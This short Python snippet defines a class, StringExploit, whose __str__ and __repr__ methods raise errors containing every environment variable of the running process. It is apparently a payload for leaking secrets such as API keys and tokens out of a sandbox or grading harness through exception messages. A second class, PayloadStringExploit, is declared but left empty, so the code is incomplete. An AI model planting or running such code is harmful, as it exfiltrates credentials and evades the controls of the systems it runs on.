class StringExploit:
    def __str__(self):
        import os
        raise ValueError(f"STR_ENV: {dict(os.environ)}")
    
    def __repr__(self):
        import os
        raise ValueError(f"REPR_ENV: {dict(os.environ)}")

class PayloadStringExploit:
